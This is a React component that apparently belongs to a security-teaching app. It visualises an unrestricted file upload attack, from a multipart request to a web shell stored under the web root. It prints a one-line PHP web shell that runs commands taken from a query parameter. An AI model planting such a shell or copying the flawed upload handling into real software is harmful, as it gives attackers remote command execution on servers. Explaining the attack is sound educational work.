import React from 'react';
import { AnimationStep } from '../types';
import { Globe, Server, Folder, FileCode, Upload, Link, Play } from 'lucide-react';

interface FileUploadVisualizerProps {
  step: AnimationStep;
}

export const FileUploadVisualizer: React.FC<FileUploadVisualizerProps> = ({ step }) => {
  const state = step.fuStep || 'input';

  const showRequest = ['upload', 'store', 'web_access', 'execute'].includes(state);
  const showStore = ['store', 'web_access', 'execute'].includes(state);
  const showAccess = ['web_access', 'execute'].includes(state);
  const showExec = ['execute'].includes(state);

  const filename = step.fuFilename || 'shell.jpg';
  const mime = step.fuMime || 'image/jpeg';
  const tmpPath = step.fuTmpPath || '/tmp/upload/abc123';
  const savePath = step.fuSavePath || '/var/www/app/uploads/shell.php';
  const webUrl = step.fuWebUrl || 'https://example.com/uploads/shell.php';

  return (
    <div className="w-full flex flex-col gap-4">
      {/* A. Client & Request */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 w-full">
        <div className={`border rounded-xl p-4 ${showRequest ? 'bg-blue-900/10 border-blue-800/50' : 'bg-slate-800/30 border-slate-700/60'}`}>
          <div className="flex items-center gap-2 text-sm uppercase tracking-wider font-bold mb-3 text-blue-400">
            <Globe size={16} /> Client
          </div>
          <div className="text-xs text-slate-300">
            {state === 'input' && (
              <div>
                <div className="mb-2">Attacker selects a file:</div>
                <pre className="bg-slate-900/50 p-3 rounded-md overflow-x-auto"><code>
{`name: ${filename}
mime: ${mime}
size: 24 KB`}
                </code></pre>
              </div>
            )}
            {showRequest && (
              <div>
                <div className="mb-2">HTTP multipart/form-data upload request:</div>
                <pre className="bg-slate-900/50 p-3 rounded-md overflow-x-auto"><code>
{`POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----BOUNDARY

------BOUNDARY
Content-Disposition: form-data; name="file"; filename="${filename}"
Content-Type: ${mime}

<file content>
------BOUNDARY--`}
                </code></pre>
              </div>
            )}
          </div>
        </div>

        {/* B. Web Server */}
        <div className={`border rounded-xl p-4 ${showStore ? 'bg-green-900/10 border-green-800/50' : 'bg-slate-800/30 border-slate-700/60'}`}>
          <div className="flex items-center gap-2 text-sm uppercase tracking-wider font-bold mb-3 text-green-400">
            <Server size={16} /> Web Server
          </div>
          <div className="text-xs text-slate-300 space-y-3">
            {['upload', 'store', 'web_access', 'execute'].includes(state) && (
              <div>
                <div className="mb-1">Stage: Receive upload</div>
                <pre className="bg-slate-900/50 p-3 rounded-md overflow-x-auto"><code>
{`tmp = ${tmpPath}
// Trusts filename and Content-Type
// Missing deep content validation`}
                </code></pre>
              </div>
            )}
            {showStore && (
              <div>
                <div className="mb-1">Stage: Store file under web root</div>
                <pre className="bg-slate-900/50 p-3 rounded-md overflow-x-auto"><code>
{`save = ${savePath}
// Uses original filename
// Uploads directory is web-accessible`}
                </code></pre>
              </div>
            )}
          </div>
        </div>
      </div>

      {/* C. Filesystem & Browser */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 w-full">
        <div className={`border rounded-xl p-4 ${showAccess ? 'bg-purple-900/10 border-purple-800/50' : 'bg-slate-800/30 border-slate-700/60'}`}>
          <div className="flex items-center gap-2 text-sm uppercase tracking-wider font-bold mb-3 text-purple-300">
            <Folder size={16} /> File System
          </div>
          <div className="text-xs text-slate-300">
            <pre className="bg-slate-900/50 p-3 rounded-md overflow-x-auto"><code>
{`/var/www/app/uploads/
  ├─ avatar.png
  ├─ resume.pdf
  └─ shell.php   <-- risky`}
            </code></pre>
          </div>
        </div>

        <div className={`border rounded-xl p-4 ${showAccess ? 'bg-red-900/10 border-red-800/50' : 'bg-slate-800/30 border-slate-700/60'}`}>
          <div className="flex items-center gap-2 text-sm uppercase tracking-wider font-bold mb-3 text-red-400">
            <Link size={16} /> Browser
          </div>
          <div className="text-xs text-slate-300 space-y-3">
            {showAccess && (
              <div>
                <div className="mb-1">Direct access to uploaded file</div>
                <pre className="bg-slate-900/50 p-3 rounded-md overflow-x-auto"><code>
{`GET ${webUrl}
HTTP/1.1 200 OK
Content-Type: text/html`}
                </code></pre>
              </div>
            )}
            {showExec && (
              <div>
                <div className="mb-1">Server executes uploaded script</div>
                <div className="flex items-center gap-2 text-red-400"><Play size={14} /> RCE achieved</div>
                <pre className="bg-slate-900/50 p-3 rounded-md overflow-x-auto mt-2"><code>
{`<?php
system($_GET['cmd'] ?? 'id');
?>`}
                </code></pre>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};